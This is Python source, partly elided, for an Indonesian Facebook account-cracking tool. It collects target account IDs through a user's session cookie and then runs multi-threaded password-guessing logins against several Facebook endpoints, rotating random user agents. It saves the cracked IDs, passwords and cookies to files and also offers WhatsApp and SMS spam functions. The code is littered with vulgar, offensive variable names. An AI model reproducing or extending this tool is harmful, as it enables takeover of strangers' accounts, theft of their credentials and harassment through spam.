#JIKA PINGIN DI RECODE JANGAN HILANGKAN MUSICNYA GUYS
#JANGAN LUPA FOLLOW GITHUB GUA GANGSTERR-YAKUZZA
#SC INI GRATIS,JANGAN DI PERJUALKAN
#@moch_nanggreal
...
from rich import print as Nangg_Badutcode_Emang_Ganteng
...
from concurrent.futures import ThreadPoolExecutor as NanggXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
try:
        import rich
except ImportError:
        Nangg_Badutcode_Emang_Ganteng(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        Nangg_Badutcode_Emang_Ganteng(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	Nangg_Badutcode_Emang_Ganteng(nel('\t• Sedang Menginstall Modul Requests •'))
...
sys.stdout.write('\x1b]2; NanggVIP Tools\x07')
...
for Genoz in range(200):
	...
	ua = f"Mozilla/5.0 (Linux; Android {versi_android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/309.0.0.16.{str(random.randint(100000, 900000))};]"
	if ua in ugen2:pass
	else:liu.append(ua)	
for Ngewe_Bocil_Sd in range(10):
	...
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
...
░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░   ░   ░ 
   ░   ░ ░   ░   ▒      ░   ░ ░ ░ ░   ░ ░ ░   ░ 
         ░       ░  ░         ░       ░       ░ 
[bold white]𝘽𝙮 [bold red]𝙼𝙾𝙲𝙷 𝙽𝙰𝙽𝙶𝙶 𝚇𝙳 [bold green]C̳o̳d̳e̳r̳ [bold yellow]   """,width=90,padding=(0,8),title=f"[bold yellow]亗 [bold green]𝙼𝙾𝙲𝙷 𝙽𝙰𝙽𝙶𝙶 𝚇𝙳 [bold yellow]亗",style=f"bold green"))		
def Login_Tai():
	os.system('clear')
	Logo_Bangsat()
	Luciver_Xploit_Emang_Ganteng(panel(f"                              [bold white]𝙰𝙺𝚄 𝙰𝙳𝙰𝙻𝙰𝙷 [bold red]𝙼𝙾𝙲𝙷 𝙽𝙰𝙽𝙶𝙶 𝚇𝙳[bold white]𝙱𝙰𝙳𝚄𝚃𝙲𝙾𝙳𝙴",width=90,title=f"[bold yellow]乂 [bold red]𝚆𝙰𝚁𝙽[bold white]𝙸𝙽𝙶! [bold yellow]乂",style=f"bold green"))
	Luciver_Xploit_Emang_Ganteng(panel(f"[bold white]𝙼𝚊𝚜𝚞𝚔𝚊𝚗 [bold green]𝙲𝚘𝚘𝚔𝚒𝚎 [bold white]𝚈𝚊𝚗𝚐 𝙼𝚊𝚜𝚒𝚑 𝙵𝚛𝚎𝚜𝚑 𝙳𝚊𝚗 𝚃𝚒𝚍𝚊𝚔 𝚃𝚎𝚛𝚔𝚊𝚒𝚝 𝚍𝚎𝚗𝚐𝚊𝚗 [bold yellow]𝙰𝟸𝙵 [bold white]𝙰𝚐𝚊𝚛 𝚋𝚒𝚜𝚊 𝚍𝚒 𝚕𝚘𝚐𝚒𝚗𝚔𝚊𝚗",width=90,title=f"[bold yellow]×͜× [bold green]𝚕𝚘𝚐𝚒𝚗 [bold yellow]×͜×",padding=(0,2),style=f"bold green"))
	cok = input(f'{k}メ࿐⁩™{N}𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝚌𝚘𝚘𝚔𝚒𝚎 :{h} ')
	try:
		...
		if len(find) == 0:print(f'> {m}cookie kamu invalid / ganti cookie lain !!!');time.sleep(2);exit()
			...
			for x in find:
				...
				exit(f"𝚃𝚘𝚔𝚎𝚗 : {took} \n{N}𝙲𝚘𝚘𝚔𝚒𝚎 {h}𝙰𝚔𝚝𝚒𝚏 {N}𝙷𝚊𝚛𝚊𝚙 𝙹𝚊𝚕𝚊𝚗𝚔𝚊𝚗 𝚞𝚕𝚊𝚗𝚐 𝚜𝚌𝚛𝚒𝚙𝚝")
...
def Menu_Gua():
	...
	Luciver_Xploit_Emang_Ganteng(panel(f"                              [bold white]𝙰𝙺𝚄 𝙰𝙳𝙰𝙻𝙰𝙷 [bold red]𝙼𝙾𝙲𝙷 𝙽𝙰𝙽𝙶𝙶 𝚇𝙳[bold white]𝙱𝙰𝙳𝚄𝚃𝙲𝙾𝙳𝙴",width=90,title=f"[bold yellow]乂 [bold red]𝚆𝙰𝚁𝙽[bold white]𝙸𝙽𝙶! [bold yellow]乂",style=f"bold green"))
	Kontol_Gua_Gede_Banget.append(panel(f'[bold yellow]乂[bold white] 𝚄𝚜𝚎𝚛 𝚄𝙸𝙳 : [bold red]{uidfb}[/] ',width=43,padding=(0,3),title=f"[bold yellow]×͜× [bold red]𝙸𝙳[bold yellow] ×͜×",style=f"bold green"))
	#Kontol_Gua_Gede_Banget.append(panel(f'[bold yellow]乂[bold white] 𝙼𝚢 𝙸𝙿    : [bold red]{ip}[/][/] ',width=43,padding=(0,3),title=f"[bold yellow]×͜× [bold white]𝙸𝙿[bold yellow] ×͜×",style=f"bold green"))
	console.print(Columns(Kontol_Gua_Gede_Banget))
	Kamu_Pericode_Yang_Handal.append(panel(f'[bold yellow]×͜×[bold red]𝙼𝙾𝙲𝙷 𝙽𝙰𝙽𝙶𝙶 𝚇𝙳[bold white]𝙱𝙰𝙳𝚄𝚃𝙲𝙾𝙳𝙴[bold yellow]',width=28,padding=(0,3),style=f"bold green"))
	Kamu_Pericode_Yang_Handal.append(panel(f'[bold white]𝚂𝚎𝚕𝚊𝚖𝚊𝚝  [bold yellow]×͜×  [bold red]𝙳𝚊𝚝𝚊𝚗𝚐\n[bold green]{nama}',width=28,padding=(0,3),title=f"[bold yellow]乂 [bold red]𝙸𝚗𝚏𝚘 [bold white]𝙿𝚎𝚛𝚒𝚌𝚘𝚍𝚎 [bold yellow]乂",style=f"bold green"))
	Kamu_Pericode_Yang_Handal.append(panel(f'[bold yellow]×͜×[bold red]𝙼𝙾𝙲𝙷 𝙽𝙰𝙽𝙶𝙶 𝚇𝙳[bold white]𝙱𝙰𝙳𝚄𝚃𝙲𝙾𝙳𝙴[bold yellow]',width=28,padding=(0,3),style=f"bold green"))
	console.print(Columns(Kamu_Pericode_Yang_Handal))
	Ngentod_Dulu_Biar_Pinter.append(panel(f'[bold white][[bold green]01[bold white]] 𝙲𝚛𝚊𝚌𝚔 [bold green]𝚃𝚎𝚖𝚊𝚗 [bold yellow]ツ\n[bold white][[bold green]02[bold white]] 𝙲𝚛𝚊𝚌𝚔 [bold green]𝙼𝚊𝚜𝚜𝚊𝚕 [bold yellow]ツ\n[bold white][[bold green]03[bold white]] 𝙲𝚛𝚊𝚌𝚔 [bold green]𝙶𝚛𝚘𝚞𝚙 [bold yellow]ツ\n[bold white][[bold green]04[bold white]] 𝙲𝚛𝚊𝚌𝚔 [bold green]𝙴𝚖𝚊𝚒𝚕 [bold yellow]ツ\n[bold white][[bold green]05[bold white]] 𝙲𝚛𝚊𝚌𝚔 [bold green]𝙵𝚒𝚕𝚎 [bold yellow]ツ',width=28,padding=(0,3),title=f"[bold yellow]複 [bold red]𝙰𝙻𝙾[bold white]𝙽𝙴 [bold yellow]複",style=f"bold green"))
	Ngentod_Dulu_Biar_Pinter.append(panel(f'[bold white][[bold green]06[bold white]] 𝙲𝚛𝚊𝚌𝚔 [bold green]𝙽𝚊𝚖𝚊 [bold yellow]ツ\n[bold white][[bold green]07[bold white]] 𝙲𝚛𝚊𝚌𝚔 [bold green]𝙵𝚘𝚕𝚕𝚘𝚠 [bold yellow]ツ\n[bold white][[bold green]08[bold white]] 𝙲𝚛𝚊𝚌𝚔 [bold green]𝙲𝚘𝚖𝚎𝚗 [bold yellow]ツ\n[bold white][[bold green]09[bold white]] 𝙲𝚎𝚔 [bold green]𝙾𝚙𝚜𝚒 [bold yellow]ツ\n[bold white][[bold green]10[bold white]] 𝙲𝚛𝚊𝚌𝚔 [bold green]𝙷𝚊𝚜𝚒𝚕 [bold yellow]ツ',width=28,padding=(0,3),title=f"[bold yellow]複 [bold red]𝙰𝙻𝙾[bold white]𝙽𝙴 [bold yellow]複",style=f"bold green"))
	Ngentod_Dulu_Biar_Pinter.append(panel(f'[bold white][[bold green]11[bold white]] 𝙷𝚎𝚊𝚍𝚎𝚛 [bold yellow]ツ\n[bold white][[bold green]12[bold white]] 𝚂𝚙𝚊𝚖 [bold green]𝙼𝚊𝚗𝚝𝚊𝚗 [bold yellow]ツ\n[bold white][[bold green]13[bold white]] 𝚂𝚙𝚊𝚖 [bold green]𝙸𝚜𝚛𝚊𝚎𝚕 [bold yellow]ツ\n[bold white][[bold green]14[bold white]] 𝙳𝚞𝚖𝚙 [bold yellow]ツ\n[bold white][[bold green]15[bold white]] [bold red]𝙳𝚎𝚕𝚎𝚝𝚎 [bold yellow]ツ',width=28,padding=(0,3),title=f"[bold yellow]複 [bold red]𝙰𝙻𝙾[bold white]𝙽𝙴 [bold yellow]複",style=f"bold green"))
	console.print(Columns(Ngentod_Dulu_Biar_Pinter))
	Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk = input(f'{k}ᶦᵅᶬܔ {N}𝙻𝚄𝙲𝙸𝚅𝙴𝚁 {k}࿐ :{h} ')
	if Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['1','01']:
	        Luciver_Xploit_Emang_Ganteng(panel(f"[bold white]𝙼𝚊𝚜𝚞𝚔𝚊𝚗 [bold green]𝚃𝙰𝚁𝙶𝙴𝚃 [bold white]𝚈𝚊𝚗𝚐 𝙼𝚊𝚜𝚒𝚑 𝙵𝚛𝚎𝚜𝚑 𝙳𝚊𝚗 𝚃𝚒𝚍𝚊𝚔 𝚃𝚎𝚛𝚔𝚊𝚒𝚝 𝚍𝚎𝚗𝚐𝚊𝚗 [bold yellow]𝙿𝚛𝚒𝚟𝚊𝚝𝚎 [bold white]𝙰𝚐𝚊𝚛 𝚋𝚒𝚜𝚊 𝚍𝚒 𝙳𝚞𝚖𝚙",width=90,title=f"[bold yellow]×͜× [bold red]𝚃𝙰𝚁[bold white]𝙶𝙴𝚃 [bold yellow]×͜×",padding=(0,2),style=f"bold green"))
	        idt = input(f'\n{k}╰━➳{N}𝚃𝙰𝚁𝙶𝙴𝚃𝙸𝙳 : {h}')
	        dump(idt,"",{"cookie":cok},token)
	        setting()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['2','02']:
		dump_massal()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['3','03']:
		Crack_Group_Sekolah_Guru_Galak()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['4','04']:
		Crack_Email_Pemerintah()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['5','05']:
		crack_file()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['6','06']:
		crack_nama()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['7','07']:
		Pengikut_Gus_Samsudin()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['8','08']:
		komen()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['9','09']:
		file_cp()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['10']:
		result()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['11']:
		siu()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['12']:
		spam_wa()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['13']:
		spam_sms()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['14']:
		dumpid()
	elif Aku______Adalah____Hengker____EpEp_____Yang____Di___Takuti___Dunia____WkWkWk in ['15']:
...
def komen():
	try:
		...
		time.sleep(5)
		Login_Tai()
	Luciver_Xploit_Emang_Ganteng(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold purple"))
...
def dumpid():
	...
	try:
		...
		exit()
def Crack_Group_Sekolah_Guru_Galak():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		...
		time.sleep(5)
		Login_Tai()
	Luciver_Xploit_Emang_Ganteng(nel(' Pastikan Idz Grup Bersifat Publik , Mohon Bersabar Dump Id Grup Sangat Lambat',width=90,style=f"bold purple"))
	url = input(f'  Id Group : ')
	Gangster_Tai_Anjing("https://mbasic.facebook.com/groups/"+url,cokies)
	print("\r")
	setting()
def Gangster_Tai_Anjing(url,cokies):
	data = parser(ses.get(url,cookies={"cookie": cokies}).text, "html.parser")
	...
	if str(judul) == 'Masuk Facebook' or str(judul) == 'Masuk Facebook | Facebook' or str(judul) == 'Masuk ke Facebook' or str(judul) == 'Log in to Facebook':
		...
		for x in data.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in x.text:
				Gangster_Tai_Anjing("https://mbasic.facebook.com"+x.get("href"),cokies)
def Pengikut_Gus_Samsudin():
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cok.txt','r').read()
	except IOError:
		...
		Login_Tai()
	ses = requests.Session()
	Luciver_Xploit_Emang_Ganteng(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold purple"))
...
def crack_nama():
	...
	Luciver_Xploit_Emang_Ganteng(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 3.000 Username",width=90,padding=(0,2),style=f"bold purple"))
...
def Crack_Email_Pemerintah():
	rc = random.choice
	rr = random.randint
	xc = [" ranti"," rindu"," duda"," janda"," montok"," tepos"," caca"," cantik"," ganteng"," jancok"," batam"," papua"," crish"," erma"," yanti"]
	blk = ['tika','milla','saitama','gabriel','lala','cans','nayla','pandi','miftah','kurnia','sinta','nadia','gadis','anggun','amoy','anna']
	global ok , cp
	Luciver_Xploit_Emang_Ganteng(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold purple"))
	nama = console.input(f'  Masukan Nama Target : ')
	if ',' in str(nama):
		print(f"  Masukan Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	Luciver_Xploit_Emang_Ganteng(nel(f'Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold purple"))
...
def crack_file():
	...
	if len(vin)==0:
		...
		setting()
def result():
	Luciver_Xploit_Emang_Ganteng(panel(f'[bold white][[bold blue]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold blue]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',width=90,padding=(0,11),title=f"[bold white][/][bold green]List Menu_Gua Cek[/][bold white][/]",style=f"bold purple"))
	kz = input(f'  Pilih : ')
	if kz in ['2','02']:
		...
		if len(vin)==0:
			...
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="hot_pink"))
...
def dump_massal():
	try:
	    ...
	    exit()
	try:
		kumpulkan = int(input(f' 𝙼𝚊𝚞 𝙱𝚛𝚊𝚙𝚊 𝙸𝙳 ? : '))
		output_file = open('Dumper/collected_ids.txt', 'w')
	except ValueError:
	    exit()
	...
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Luciver_Xploit_Emang_Ganteng(panel(f'[cyan]       𝙼𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝙸𝙳 𝚂𝚊𝚝𝚞 𝙿𝚎𝚛𝚜𝚊𝚝𝚞! ',width=43,title=f"[[yellow] ALEX•GANS [/]]",style=f"bold green"))
		Masukan = input(f'{b} 𝙼𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝙸𝙳 𝚈𝚊𝚗𝚐 𝚔𝚎  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	      ...
	      pass
	        ...
	        exit()
	try:
	      #prints(panel(f"{b} 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐠𝐮𝐧𝐩𝐮𝐥𝐤𝐚𝐧 𝐢𝐝 [green]{len(id)}[blue] id....",title=f"[[yellow]Alex•Gans[/]]",style=f"bold green"))
	      atur_id()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
...
def dump(idt,fields,cookie,token):	
	try:
		...
		for i in url["friends"]["data"]:
			...
			#sys.stdout.write(f"\r{k}╰━➳{N} ID : {H}{len(id)}{P} Mengumpulkan...."),			
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
def setting():	
	print('')
	Luciver_Xploit_Emang_Ganteng(panel(f'                        [bold white][[bold green]01[/][bold white]][/] [bold white]𝚄𝙸𝙳 𝙻𝚊𝚖𝚊 𝚔𝚎 [bold green]𝙱𝚊𝚛𝚞\n                        [bold white][[bold green]02[/][bold white]][/] [bold white]𝚄𝙸𝙳 𝙱𝚊𝚛𝚞 𝙺𝚎 [bold green]𝙻𝚊𝚖𝚊[/]\n                        [bold white][[bold green]03[/][bold white]][/] [bold white]𝚄𝙸𝙳 [bold green]𝚁𝚊𝚗𝚍𝚘𝚖',width=90,padding=(0,8),title=f"[bold yellow]×͜× [bold red]𝚂𝙴𝚃𝚃𝙸𝙽𝙶 [bold white]𝚄𝙸𝙳 [bold yellow]×͜×",style=f"bold green"))
	Pericode_Ngebol_Sama_Kambing_= input(f'{k}ᶦᵅᶬܔ {N}𝙻𝚄𝙲𝙸𝚅𝙴𝚁 {k}࿐ : ')
	if Pericode_Ngebol_Sama_Kambing_ in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif Pericode_Ngebol_Sama_Kambing_ in ['2','02']:
		muda=[]
		...
		for xmud in range(bcm):
			...
			bcmi -=1
	elif Pericode_Ngebol_Sama_Kambing_ in ['3','03']:
		for bacot in id:
		...
		exit()
	urut = []
	Luciver_Xploit_Emang_Ganteng(panel(f'                  [bold white][[bold green]01[/][bold white]][/] [bold white][bold white]𝙻𝚘𝚐𝚒𝚗 𝚂𝚒𝚝𝚞𝚜 [bold green]𝚖.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔.𝚌𝚘𝚖\n                  [bold white][[bold green]02[/][bold white]][/] [bold white]𝙻𝚘𝚐𝚒𝚗 𝚂𝚒𝚝𝚞𝚜 [bold green]𝚖𝚋𝚊𝚜𝚒𝚌.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔.𝚌𝚘𝚖\n                  [bold white][[bold green]03[/][bold white]][/] [bold white]𝙻𝚘𝚐𝚒𝚗 𝚂𝚒𝚝𝚞𝚜 [bold green]𝚛𝚎𝚐𝚞𝚕𝚎𝚛.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔.𝚌𝚘𝚖\n                  [bold white][[bold green]04[/][bold white]][/] [bold white]𝙻𝚘𝚐𝚒𝚗 𝚂𝚒𝚝𝚞𝚜 [bold green]𝚐𝚛𝚊𝚙𝚑.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔.𝚌𝚘𝚖\n                  [bold white][[bold green]05[/][bold white]][/] [bold white]𝙻𝚘𝚐𝚒𝚗 𝚂𝚒𝚝𝚞𝚜 [bold green]𝚊𝚜𝚢𝚌𝚗.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔.𝚌𝚘𝚖\n                  [bold white][[bold green]06[/][bold white]][/] [bold white]𝙻𝚘𝚐𝚒𝚗 𝚂𝚒𝚝𝚞𝚜 [bold green]𝚖.𝚊𝚕𝚙𝚑𝚊.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔.𝚌𝚘𝚖\n                  [bold white][[bold green]07[/][bold white]][/] [bold white]𝙻𝚘𝚐𝚒𝚗 𝚂𝚒𝚝𝚞𝚜 [bold green]𝚡.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔.𝚌𝚘𝚖\n                  [bold white][[bold green]08[/][bold white]][/] [bold white]𝙻𝚘𝚐𝚒𝚗 𝚂𝚒𝚝𝚞𝚜 [bold green]𝚍.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔.𝚌𝚘𝚖',width=90,padding=(0,8),title=f"[bold yellow]×͜× [bold red]𝚂𝙴𝚃𝚃𝙸𝙽𝙶 [bold white]𝙼𝙴𝚃𝙾𝙳𝙴 [bold yellow]×͜×",style=f"bold green"))	
	Nancy_Momoland_Ceweku = input(f'{k}ᶦᵅᶬܔ {N}𝙻𝚄𝙲𝙸𝚅𝙴𝚁 {k}࿐ : ')
	if Nancy_Momoland_Ceweku in ['1','01']:
		method.append('validate1')
	elif Nancy_Momoland_Ceweku in ['2','02']:
		method.append('validate2')
	elif Nancy_Momoland_Ceweku in ['3','03']:
		method.append('reguler1')
	elif Nancy_Momoland_Ceweku in ['4','04']:
		method.append('reguler2')
	elif Nancy_Momoland_Ceweku in ['5','05']:
	    method.append('kontol')
	elif Nancy_Momoland_Ceweku in ['6','06']:
	    method.append('bapi')
	elif Nancy_Momoland_Ceweku in ['7','07']:
	    method.append('colmek1')
	elif Nancy_Momoland_Ceweku in ['8','8']:
	    method.append('colmek2')
	else:
		method.append('validate1')
	Luciver_Xploit_Emang_Ganteng(panel(f'                       [bold white][[bold green]01[/][bold white]][/] [bold white][bold white]𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 [bold green]𝙿𝙴𝚁𝚃𝙰𝙼𝙰\n                       [bold white][[bold green]02[/][bold white]][/] [bold white][bold white]𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 [bold green]𝙺𝙴𝙳𝚄𝙰\n                       [bold white][[bold green]03[/][bold white]][/] [bold white][bold white]𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 [bold red]𝙼𝙰𝙽𝚄𝙰𝙻',width=90,padding=(0,8),title=f"[bold yellow]×͜× [bold red]𝚂𝙴𝚃𝚃𝙸𝙽𝙶 [bold white]𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 [bold yellow]×͜×",style=f"bold green"))	
	...
	if pwplus in ['03','3']:
		...
		pwpluss.append('no')	
	Luciver_Xploit_Emang_Ganteng(panel(f'[bold white]𝙰𝚙𝚊𝚔𝚊𝚑 𝙺𝚊𝚖𝚞 𝙸𝚗𝚐𝚒𝚗 𝙼𝚎𝚗𝚊𝚖𝚙𝚒𝚕𝚔𝚊𝚗 𝙰𝚙𝚕𝚒𝚔𝚊𝚜𝚒 𝚈𝚊𝚗𝚐 𝚃𝚎𝚛𝚔𝚊𝚒𝚝 𝙳𝚒 𝙳𝚊𝚕𝚊𝚖 ??𝚔𝚞𝚗 ? 𝚈/𝚃',width=90,padding=(0,8),title=f"[bold yellow]×͜× [bold red]𝚂𝙴𝚃𝚃𝙸𝙽𝙶 [bold white]𝙰𝙿𝙻𝙸??𝙰𝚂𝙸 [bold yellow]×͜×",style=f"bold green"))	
	Alah_Bacot_Njing = input('  Pilih : ')
	if Alah_Bacot_Njing in ['']:
		print('  Pilih Yang Bener Kontol ')
		exit()
	elif Alah_Bacot_Njing in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')	
	Luciver_Xploit_Emang_Ganteng(panel(f'[bold white]𝙰𝚙𝚊𝚔𝚊𝚑 𝙺𝚊𝚖𝚞 𝙸𝚗𝚐𝚒𝚗 𝙼𝚎𝚗𝚊𝚖𝚙𝚒𝚕𝚔𝚊𝚗 𝙾𝚙𝚜𝚒 𝙲𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝 𝙳𝚒 𝙳𝚊𝚕𝚊𝚖 𝙰𝚔𝚞𝚗 ? 𝚈/𝚃',width=90,padding=(0,8),title=f"[bold yellow]×͜× [bold red]𝚂𝙴𝚃𝚃𝙸𝙽𝙶 [bold white]𝙾𝙿𝚂𝙸 [bold yellow]×͜×",style=f"bold green"))	
	Alah_Bacot_Njing = input('  Pilih : ')
	if Alah_Bacot_Njing in ['']:
		print('  Pilih Yang Bener Kontol ')
		exit()
		...
		gabriel.append('no')	
	Luciver_Xploit_Emang_Ganteng(panel(f'[bold white]𝙰𝚙𝚊𝚔𝚊𝚑 𝙺𝚊𝚖𝚞 𝙸𝚗𝚐𝚒𝚗 𝙼𝚎𝚗𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚄𝚜𝚎𝚛-𝙰𝚐𝚎𝚗𝚝 𝙼𝚊𝚗𝚞𝚊𝚕 𝚄𝚗𝚝𝚞𝚔 𝙼𝚎𝚕𝚊𝚔𝚞𝚔𝚊𝚗 𝙲𝚛𝚊𝚌𝚔 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 ? 𝚈/𝚃',width=90,padding=(0,8),title=f"[bold yellow]×͜× [bold red]𝚂𝙴𝚃𝚃𝙸𝙽𝙶 [bold white]𝚄𝚂𝙴𝚁𝙶𝙴𝙽𝚃 [bold yellow]×͜×",style=f"bold green"))	
	Tambah_Ua_Dulu_Lol = input(f'  Pilih : ')
	if Tambah_Ua_Dulu_Lol in ['y','Ya','ya','Y']:
		ualuh.append('ya')
...
def passwrd():
	global prog,des
	print('')
	Jangan_Cabul_Sama_Anak_Sd = []
	Jangan_Cabul_Sama_Anak_Sd.append(panel(f'        [bold green]%s [bold white]'%(okc),width=43,title=f"[bold yellow]×͜× [bold red]𝚂𝙰𝚅𝙴 [bold white]𝙾𝙺 [bold yellow]×͜×",style=f"bold green"))
	Jangan_Cabul_Sama_Anak_Sd.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=44,title=f"[bold yellow]×͜× [bold red]𝚂𝙰𝚅𝙴 [bold white]𝙲𝙿 [bold yellow]×͜×",style=f"bold green"))
	wa.print(Columns(Jangan_Cabul_Sama_Anak_Sd))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as Aku_Sudah_Jembutan:
			for nancy_momoland in id2:
				idf,nmf = nancy_momoland.split('|')[0],nancy_momoland.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
				...
				if 'validate1' in method:
					Aku_Sudah_Jembutan.submit(validate1,idf,pwv)
				elif 'validate2' in method:
					Aku_Sudah_Jembutan.submit(validate2,idf,pwv)
				elif 'reguler1' in method:
					Aku_Sudah_Jembutan.submit(reguler1,idf,pwv)
				elif 'reguler2' in method:
					Aku_Sudah_Jembutan.submit(reguler2,idf,pwv)
				elif 'bapi' in method:
					Aku_Sudah_Jembutan.submit(bapi,idf,pwv)
				elif 'kontol' in method:
					Aku_Sudah_Jembutan.submit(kontol,idf,pwv)
				elif 'colmek1' in method:
					Aku_Sudah_Jembutan.submit(colmek1,idf,pwv)
				elif 'colmek2' in method:
					Aku_Sudah_Jembutan.submit(colmek2,idf,pwv)
				else:
					Aku_Sudah_Jembutan.submit(validate1,idf,pwv)
		print('')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					Luciver_Xploit_Emang_Ganteng(panel(f'[bold hot_pink]USERNAME : {idf}\nPASSWORD : {pw}',width=90,padding=(0,8),title=f"[bold cyan]×͜× [bold green]𝚂𝙴𝚃𝚃𝙸𝙽𝙶 [bold purple]𝚄𝚂𝙴𝚁𝙶𝙴𝙽𝚃 [bold blue]×͜×",style=f"bold hot_pink"))	
					Luciver_Xploit_Emang_Ganteng(panel(f'[bold purple]USERAGENT : {ua}',width=90,padding=(0,8),style=f"bold hot_pink"))	
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold hot_pink', title='Sukses')
					Luciver_Xploit_Emang_Ganteng(statusok1)
...
def validate2(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Validate V2[bold white] {loop}/{len(id)} OK-:[bold hot_pink]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='Checkpoint')
					Luciver_Xploit_Emang_Ganteng(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
...
def reguler1(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Reguler V1[bold white] {loop}/{len(id)} OK-:[bold hot_pink]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
